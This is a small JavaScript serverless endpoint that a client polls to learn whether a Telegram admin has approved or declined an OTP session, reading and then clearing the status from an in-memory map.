// api/checkStatus.js
// Client polls this to learn if Telegram admin clicked Proceed or Decline

if (!global._otpStatuses) global._otpStatuses = {};

export default function handler(req, res) {
  const { sessionId } = req.query;
  if (!sessionId) return res.status(400).json({ error: 'Missing sessionId' });

  const status = global._otpStatuses[sessionId] || 'pending';

  // Clean up once consumed (not pending)
  if (status !== 'pending') {
    delete global._otpStatuses[sessionId];
  }

  return res.status(200).json({ status });
}
